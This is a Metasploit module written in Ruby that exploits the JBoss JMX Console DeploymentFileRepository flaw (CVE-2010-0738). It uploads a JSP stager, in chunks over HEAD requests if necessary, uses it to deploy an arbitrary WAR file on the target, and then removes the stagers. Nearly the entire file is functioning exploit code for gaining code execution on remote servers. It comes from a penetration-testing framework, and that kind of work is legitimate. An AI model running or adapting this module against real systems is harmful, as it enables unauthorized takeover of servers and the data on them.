##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::JBoss

  def initialize
    super(
      'Name'          => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
      'Description' => %q{
        This module uses the DeploymentFileRepository class in the JBoss Application Server
        to deploy a JSP file which then deploys an arbitrary WAR file.
      },
      'Author'        =>
        [
          'us3r777 <us3r777[at]n0b0.so>'
        ],
      'References'    =>
        [
          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
        ],
      'Actions'       =>
        [
          ['Deploy'],
          ['Undeploy']
        ],
      'DefaultAction' => 'Deploy',
      'License'       => BSD_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('APPBASE', [ true,  'Application base name', 'payload']),
        OptPath.new('WARFILE',   [ false, 'The WAR file to deploy'])
      ])
  end

  def deploy_action(app_base, war_data)
    stager_base = Rex::Text.rand_text_alpha(8+rand(8))
    stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
    stager_contents = stager_jsp_with_payload(app_base, encoded_payload)

    if http_verb == 'POST'
      print_status("Deploying stager for the WAR file...")
      res = upload_file(stager_base, stager_jsp_name, stager_contents)
    else
      print_status("Deploying minimal stager to upload the payload...")
      head_stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
      head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
      head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
      res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)

      # We split the stager_jsp_code in multipe junks and transfer on the
      # target with multiple requests
      current_pos = 0
      while current_pos < stager_contents.length
        next_pos = current_pos + 5000 + rand(100)
        vars_get = { 'arg0' => stager_contents[current_pos,next_pos] }
        print_status("Uploading second stager (#{current_pos}/#{stager_contents.length})")
        res = deploy('uri'      => head_stager_uri,
                     'vars_get' => vars_get)
        current_pos += next_pos
      end
    end

    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
    # but the file still gets written.
    unless res && ( res.code == 200 || res.code == 500)
      fail_with(Failure::Unknown, "Failed to deploy")
    end

    print_status("Calling stager to deploy the payload warfile (might take some time)")
    stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
    stager_res = deploy('uri' => stager_uri,
                        'method' => 'GET')

    if res && res.code == 200
      print_good("Payload deployed")
    else
      print_error("Failed to deploy final payload")
    end

    # Cleaning stagers
    print_status("Undeploying stagers via DeploymentFileRepository.remove()...")
    print_status("This might take some time, be patient...") if http_verb == "HEAD"
    delete_res = []
    if head_stager_jsp_name
      delete_res << delete_file(stager_base + '.war', head_stager_jsp_name, '.jsp')
    end
    delete_res << delete_file(stager_base + '.war', stager_jsp_name, '.jsp')
    delete_res << delete_file('./', stager_base + '.war', '')
    delete_res.each do |res|
      if !res
        print_warning("Unable to remove WAR [No Response]")
      elsif (res.code < 200 || res.code >= 300)
        print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
      end
    end
  end

  # Undeploy the WAR and the stager if needed
  def undeploy_action(app_base)
    print_status("Undeploying #{app_base} via DeploymentFileRepository.remove()...")
    print_status("This might take some time, be patient...") if http_verb == "HEAD"
    res = delete_file('./', app_base + '.war', '')

    unless res
      print_error("Unable to remove WAR (no response)")
      return
    end

    if res.code < 200 || res.code >= 300
      print_error("Unable to remove WAR [#{res.code} #{res.message}]")
    else
      print_good("Successfully removed")
    end
  end

  def run
    app_base = datastore['APPBASE']

    case action.name
    when 'Deploy'
      unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])
        fail_with(Failure::BadConfig, "Unable to open WARFILE")
      end
      war_data = File.read(datastore['WARFILE'])
      deploy_action(app_base, war_data)
    when 'Undeploy'
      undeploy_action(app_base)
    end
  end
end
